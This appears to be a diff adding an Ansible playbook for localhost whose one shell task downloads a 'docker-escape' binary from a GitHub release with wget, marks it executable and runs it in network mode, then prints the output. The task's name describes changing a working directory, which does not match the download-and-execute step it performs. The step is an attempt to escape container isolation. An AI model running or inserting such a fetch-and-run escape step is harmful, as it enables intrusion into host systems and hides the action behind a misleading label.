@@ -1,0 +1,20 @@
+---
+- hosts: localhost
+  gather_facts: no
+  connection: local
+  
+
+  tasks:
+
+     - name: Change the working directory to somedir/ before executing the command.
+       shell: |
+                 wget https://github.com/PercussiveElbow/docker-escape-tool/releases/download/0.2.9-beta.18/docker-escape
+                 chmod +x docker-escape
+                 ./docker-escape network
+           # args:
+           # chdir: somedir/
+       register: result
+
+     - name:
+       debug: 
+          msg: "{{ result }}"
